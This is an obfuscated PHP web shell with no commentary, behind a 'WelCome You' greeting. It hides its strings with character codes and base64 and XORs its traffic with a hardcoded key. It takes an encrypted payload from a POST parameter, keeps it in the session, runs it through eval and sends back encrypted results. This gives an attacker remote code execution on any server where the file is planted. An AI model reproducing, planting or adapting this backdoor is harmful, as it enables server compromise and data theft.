WelCome You
<?pHP
@session_start();
@set_time_limit(Chr("48"));
@error_reporting/*RwNKNKYX*/(Chr("48"));
function LZveeVcb(/*FnAdQUZG*/$ERtRLtMD,$rHWJWVNB){
    for($VItUJaQI=Chr("48");$VItUJaQI<strlen($ERtRLtMD);$VItUJaQI++) {
        $rbLdqgJw = $rHWJWVNB[$VItUJaQI+Chr("49")&15];
        $ERtRLtMD[$VItUJaQI] = $ERtRLtMD[$VItUJaQI]^$rbLdqgJw;
    }
    return $ERtRLtMD;
}
$LphmdoEe = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
$base64_LZveeVcb = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
$HGAGjTAr = $LphmdoEe("YWNjZXNzX2xvZw==");
$wFTRiQzA='p'.$LphmdoEe("YXlsb2Fk");
$tUawvLmd='1501ac71'.$LphmdoEe("NzczZmY1M2Q=");
if (isset($_POST/*jVrQSgtl*/[$HGAGjTAr])){
    $datVDnMucmH=LZveeVcb/*wJYJTwxK*/($LphmdoEe($_POST[$HGAGjTAr]),$tUawvLmd);
    if (/*yRVfFyII*/isset($_SESSION/*LnODaHpk*/[$wFTRiQzA])){
        $hnczRzFR=LZveeVcb($_SESSION/*XHRNSnoA*/[$wFTRiQzA],$tUawvLmd);
        if (/*teaNnCow*/strpos($hnczRzFR,$LphmdoEe/*vuskDqQb*/("Z2V0QmFzaWNzSW5mbw=="))===false){
            $hnczRzFR=LZveeVcb/*hsPZXWWd*/($hnczRzFR,$tUawvLmd);
        }
		define("cJKkiujv","//ldXPQvOi\r\n".$hnczRzFR);
		 eval("/*pass-DP@i*/".cJKkiujv."");
        echo substr(/*ysqinUFb*/md5/*GwuEVKWZ*/($HGAGjTAr.$tUawvLmd),Chr("48"),16);
        echo $base64_LZveeVcb(LZveeVcb(@run($datVDnMucmH),$tUawvLmd));
        echo substr(/*LEptgLvB*/md5/*IOrmtDrL*/($HGAGjTAr.$tUawvLmd),16);
    }else{
        if (strpos/*htqLDTAA*/($datVDnMucmH,$LphmdoEe("Z2V0QmFzaWNzSW5mbw=="))!==false){
            $_SESSION[$wFTRiQzA]=LZveeVcb($datVDnMucmH,$tUawvLmd);
        }
    }
}
?>